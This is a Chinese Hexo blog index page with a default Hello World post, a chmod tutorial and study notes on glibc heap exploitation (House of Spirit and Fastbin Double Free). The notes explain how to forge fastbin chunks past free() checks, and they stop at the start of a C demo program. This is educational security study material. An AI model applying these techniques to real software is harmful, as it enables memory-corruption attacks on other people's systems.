<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/05/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/05/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-12-05 14:26:58" itemprop="dateCreated datePublished" datetime="2024-12-05T14:26:58+08:00">2024-12-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/22/chmod/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/22/chmod/" class="post-title-link" itemprop="url">chmod</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-11-22 22:19:37 / 修改时间：22:20:52" itemprop="dateCreated datePublished" datetime="2024-11-22T22:19:37+08:00">2024-11-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Linux-chmod命令"><a href="#Linux-chmod命令" class="headerlink" title="Linux chmod命令"></a>Linux chmod命令</h1><p>Linux chmod（英文全拼：change mode）命令是控制用户对文件的权限的命令</p>
<p>Linux&#x2F;Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/file-permissions-rwx.jpg" alt="img"></p>
<p>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/rwx-standard-unix-permission-bits.png" alt="img"></p>
<p><strong>使用权限</strong> : 所有使用者</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-cfvR] [--help] [--version] mode file...</span><br></pre></td></tr></table></figure>

<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>mode : 权限设定字串，格式如下 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-=][rwxX]...][,...]</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<ul>
<li>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</li>
<li>+ 表示增加权限、- 表示取消权限、&#x3D; 表示唯一设定权限。</li>
<li>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</li>
</ul>
<p>其他参数说明：</p>
<ul>
<li>-c : 若该文件权限确实已经更改，才显示其更改动作</li>
<li>-f : 若该文件权限无法被更改也不要显示错误讯息</li>
<li>-v : 显示权限变更的详细资料</li>
<li>-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更)</li>
<li>–help : 显示辅助说明</li>
<li>–version : 显示版本</li>
</ul>
<h3 id="符号模式"><a href="#符号模式" class="headerlink" title="符号模式"></a>符号模式</h3><p>使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和 permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who 指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示:</p>
<table>
<thead>
<tr>
<th align="left">who</th>
<th align="left">用户类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>u</code></td>
<td align="left">user</td>
<td align="left">文件所有者</td>
</tr>
<tr>
<td align="left"><code>g</code></td>
<td align="left">group</td>
<td align="left">文件所有者所在组</td>
</tr>
<tr>
<td align="left"><code>o</code></td>
<td align="left">others</td>
<td align="left">所有其他用户</td>
</tr>
<tr>
<td align="left"><code>a</code></td>
<td align="left">all</td>
<td align="left">所有用户, 相当于 <em>ugo</em></td>
</tr>
</tbody></table>
<p>operator 的符号模式表:</p>
<table>
<thead>
<tr>
<th align="left">Operator</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+</code></td>
<td align="left">为指定的用户类型增加权限</td>
</tr>
<tr>
<td align="left"><code>-</code></td>
<td align="left">去除指定用户类型的权限</td>
</tr>
<tr>
<td align="left"><code>=</code></td>
<td align="left">设置指定用户权限的设置，即将用户类型的所有权限重新设置</td>
</tr>
</tbody></table>
<p>permission 的符号模式表:</p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">名字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>r</code></td>
<td align="left">读</td>
<td align="left">设置为可读权限</td>
</tr>
<tr>
<td align="left"><code>w</code></td>
<td align="left">写</td>
<td align="left">设置为可写权限</td>
</tr>
<tr>
<td align="left"><code>x</code></td>
<td align="left">执行权限</td>
<td align="left">设置为可执行权限</td>
</tr>
<tr>
<td align="left"><code>X</code></td>
<td align="left">特殊执行权限</td>
<td align="left">只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td>
</tr>
<tr>
<td align="left"><code>s</code></td>
<td align="left">setuid&#x2F;gid</td>
<td align="left">当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td>
</tr>
<tr>
<td align="left"><code>t</code></td>
<td align="left">粘贴位</td>
<td align="left">设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td>
</tr>
</tbody></table>
<h3 id="八进制语法"><a href="#八进制语法" class="headerlink" title="八进制语法"></a>八进制语法</h3><p>chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。</p>
<table>
<thead>
<tr>
<th align="left">#</th>
<th align="left">权限</th>
<th align="left">rwx</th>
<th align="left">二进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">7</td>
<td align="left">读 + 写 + 执行</td>
<td align="left">rwx</td>
<td align="left">111</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">读 + 写</td>
<td align="left">rw-</td>
<td align="left">110</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">读 + 执行</td>
<td align="left">r-x</td>
<td align="left">101</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">只读</td>
<td align="left">r–</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">写 + 执行</td>
<td align="left">-wx</td>
<td align="left">011</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">只写</td>
<td align="left">-w-</td>
<td align="left">010</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">只执行</td>
<td align="left">–x</td>
<td align="left">001</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">无</td>
<td align="left">—</td>
<td align="left">000</td>
</tr>
</tbody></table>
<p>例如， 765 将这样解释：</p>
<ul>
<li>所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。</li>
<li>用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。</li>
<li>其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure>

<p>为 ex1.py 文件拥有者增加可执行权限:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure>

<p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure>

<p>此外chmod也可以用数字来表示权限如 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure>

<p>语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod abc file</span><br></pre></td></tr></table></figure>

<p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。</p>
<h4 id="r-4，w-2，x-1"><a href="#r-4，w-2，x-1" class="headerlink" title="r&#x3D;4，w&#x3D;2，x&#x3D;1"></a>r&#x3D;4，w&#x3D;2，x&#x3D;1</h4><ul>
<li>若要 rwx 属性则 4+2+1&#x3D;7；</li>
<li>若要 rw- 属性则 4+2&#x3D;6；</li>
<li>若要 r-x 属性则 4+1&#x3D;5。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx file</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure>

<p>效果相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x file</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 771 file</span><br></pre></td></tr></table></figure>

<p>效果相同</p>
<p>若用 <strong>chmod 4755 filename</strong> 可使此程序具有 root 的权限。</p>
<h3 id="更多说明"><a href="#更多说明" class="headerlink" title="更多说明"></a>更多说明</h3><table>
<thead>
<tr>
<th align="left"><code>命令</code></th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>chmod a+r *file*</code></td>
<td align="left">给file的所有用户增加读权限</td>
</tr>
<tr>
<td align="left"><code>chmod a-x *file*</code></td>
<td align="left">删除file的所有用户的执行权限</td>
</tr>
<tr>
<td align="left"><code>chmod a+rw *file*</code></td>
<td align="left">给file的所有用户增加读写权限</td>
</tr>
<tr>
<td align="left"><code>chmod +rwx *file*</code></td>
<td align="left">给file的所有用户增加读写执行权限</td>
</tr>
<tr>
<td align="left"><code>chmod u=rw,go= *file*</code></td>
<td align="left">对file的所有者设置读写权限，清空该用户组和其他用户对file的所有权限（空格代表无权限）</td>
</tr>
<tr>
<td align="left"><code>chmod -R u+r,go-r *docs*</code></td>
<td align="left">对目录docs和其子目录层次结构中的所有文件给用户增加读权限，而对用户组和其他用户删除读权限</td>
</tr>
<tr>
<td align="left"><code>chmod 664 *file*</code></td>
<td align="left">对file的所有者和用户组设置读写权限, 为其其他用户设置读权限</td>
</tr>
<tr>
<td align="left"><code>chmod 0755 *file*</code></td>
<td align="left">相当于<code>u=rwx (4+2+1),go=rx (4+1 &amp; 4+1)</code>。<code>0</code> 没有特殊模式。</td>
</tr>
<tr>
<td align="left"><code>chmod 4755 *file*</code></td>
<td align="left"><code>4</code>设置了设置<a target="_blank" rel="noopener" href="https://www.runoob.com/wiki/%E7%94%A8%E6%88%B7ID">用户ID</a>位，剩下的相当于 u&#x3D;rwx (4+2+1),go&#x3D;rx (4+1 &amp; 4+1)。</td>
</tr>
<tr>
<td align="left"><code>find path/ -type d -exec chmod a-x &#123;&#125; \;</code></td>
<td align="left">删除可执行权限对path&#x2F;以及其所有的目录（不包括文件）的所有用户，使用’-type f’匹配文件</td>
</tr>
<tr>
<td align="left"><code>find path/ -type d -exec chmod a+x &#123;&#125; \;</code></td>
<td align="left">允许所有用户浏览或通过目录path&#x2F;</td>
</tr>
</tbody></table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/20/HouseOfSpirit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/20/HouseOfSpirit/" class="post-title-link" itemprop="url">HouseOfSpirit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-20 22:25:14" itemprop="dateCreated datePublished" datetime="2024-11-20T22:25:14+08:00">2024-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-22 19:49:10" itemprop="dateModified" datetime="2024-11-22T19:49:10+08:00">2024-11-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h5 id="核心："><a href="#核心：" class="headerlink" title="核心："></a>核心：</h5><p>在目标位置处伪造fastbin chunk，并将其释放，从而达到分配指定地址的chunk的目的</p>
<h5 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h5><p>fastbin double free所释放的chunk是<strong>本身程序自己malloc产生的</strong>，但是house of spirit是<strong>去释放指定地址的chunk</strong>。那么这个chunk我们可以通过<em>伪造的方式</em>构建，他可以是<em>任意可写地址</em>。在释放时，需要经过一些检查，去判断该释放的chunk是否为程序自身创建的。那么需要绕过这些检查：</p>
<ul>
<li><h5 id="fake-chunk-的-ISMMAP-位不能为-1，因为-free-时，如果是-mmap-的-chunk，会单独处理"><a href="#fake-chunk-的-ISMMAP-位不能为-1，因为-free-时，如果是-mmap-的-chunk，会单独处理" class="headerlink" title="fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理"></a>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</h5><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的，这个标志位位于size低二比特位</p>
</li>
<li><h5 id="fake-chunk-地址需要对齐，-MALLOC-ALIGN-MASK"><a href="#fake-chunk-地址需要对齐，-MALLOC-ALIGN-MASK" class="headerlink" title="fake chunk 地址需要对齐， MALLOC_ALIGN_MASK"></a>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</h5><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐。</p>
<p>比如32位程序的话fake_chunk的prev_size所在地址就应该位0xXXXX0或0xXXXX4。</p>
<p>​       64位的话地址就应该在0xXXXX0或0xXXXX8。</p>
</li>
<li><h5 id="fake-chunk-的-size-大小需要满足对应的-fastbin-的需求，同时也得对齐"><a href="#fake-chunk-的-size-大小需要满足对应的-fastbin-的需求，同时也得对齐" class="headerlink" title="fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐"></a>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</h5><p>fake_chunk如果想挂进fastbin的话构造的大小就不能大于0x80，关于对齐和上面一样，并且在确定prev_size的位置后size所在位置要满足堆块结构的摆放位置</p>
</li>
<li><h5 id="fake-chunk-的-next-chunk-的大小不能小于-2-SIZE-SZ，同时也不能大于av-system-mem"><a href="#fake-chunk-的-next-chunk-的大小不能小于-2-SIZE-SZ，同时也不能大于av-system-mem" class="headerlink" title="fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem"></a>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</h5><p>fake_chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。</p>
<p>32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
<p>最大不能超过av-&gt;system_mem，即128kb。</p>
<p>next_chunk的大小一般我们会设置成为一个超过fastbin最大的范围的一个数，但要小于128kb，这样做的目的是在chunk连续释放的时候，能够保证伪造的chunk在释放后能够挂在fastbin中main_arena的前面，这样以来我们再一次申请伪造chunk大小的块时可以直接重启伪造chunk。</p>
</li>
<li><h5 id="fake-chunk-对应的-fastbin-链表头部不能是该-fake-chunk，即不能构成-double-free-的情况"><a href="#fake-chunk-对应的-fastbin-链表头部不能是该-fake-chunk，即不能构成-double-free-的情况" class="headerlink" title="fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况"></a>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</h5><p>这个检查就是fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/17/FastbinAttack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/17/FastbinAttack/" class="post-title-link" itemprop="url">FastbinAttack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-17 19:47:26" itemprop="dateCreated datePublished" datetime="2024-11-17T19:47:26+08:00">2024-11-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-20 22:23:22" itemprop="dateModified" datetime="2024-11-20T22:23:22+08:00">2024-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Fastbin Attack</p>
<p>图文源<a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/109199077">好好说话之Fastbin Attack（1）：Fastbin Double Free_pwn 好好说话-CSDN博客</a>根据自己理解做了摘抄</p>
<p>​	这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是：</p>
<blockquote>
<p>存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>漏洞发生于fastbin类型的chunk中</p>
</blockquote>
<p>​	如果细分的话，可以做如下的分类：</p>
<blockquote>
<p>Fastbin Double Free<br>House of Spirit<br>Alloc to Stack<br>Arbitrary Alloc</p>
</blockquote>
<p>​	前两种主要漏洞侧重于利用free函数释放的真的 chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc申请指定位置chunk进行攻击。主要讲解Fastbin Double Free。</p>
<p><strong>原理</strong><br>    fastbin attack存在的原因在于fastbin时使用单向链表来维护释放的堆块的，并且由fastbin管理的chunk即使被释放，其next_chunk的prev_inuse位也不会被清空。</p>
<ul>
<li>在fastbin中后一个被释放的chunk的fd指向前一个被释放的chunk的prev_size，main_arena指向最后一个被释放的chunk的prev_size。</li>
<li>看一下在释放阶段的chunk的prev_inuse标志位为1，回来在看释放后的内存情况，chunk的<code>prev_inuse</code>依然还是1不变。</li>
<li>fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。</li>
</ul>
<p><strong>Fastbin Double Free</strong></p>
<p>fastbin中的chunk被释放<strong>两次及以上</strong>。后果是多次分配可从fastbin链表中取出同一个堆块，结合堆块的数据内容可以实现类似于**类型混淆(<em>type confused</em>)**的效果。</p>
<p><strong>Fastbin Double Free成功利用主要原因：</strong></p>
<blockquote>
<p>fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空。<br>fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g hollk4.c -o hollk4</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="keyword">typedef</span> 